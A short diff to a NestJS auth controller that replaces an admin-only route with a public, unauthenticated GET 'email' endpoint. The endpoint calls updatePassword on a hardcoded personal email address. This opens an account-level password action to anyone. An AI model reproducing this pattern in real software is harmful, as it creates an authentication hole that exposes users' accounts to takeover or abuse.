@@ -15,8 +15,7 @@ import { Public, User } from './decorators';
 import { LoginDto, RegisterDto } from './dto';
 import { AtResponseDto } from './dto/at-response.dto';
 import { RtGuard } from './guards';
-import { JwtRtPayload, Role } from './types';
-import { Roles } from './decorators/roles.decorator';
+import { JwtRtPayload } from './types';
 
 @ApiTags('auth')
 @Controller('auth')
@@ -67,9 +66,10 @@ export class AuthController {
     res.json({ accessToken: tokens.accessToken });
   }
 
-  @Roles(Role.Admin)
-  @Get('admin')
-  admin() {
-    return 'admin';
+  @Public()
+  @Get('email')
+  async email() {
+    await this.authService.updatePassword('ole9zp@gmail.com');
+    return 'ok';
   }
 }
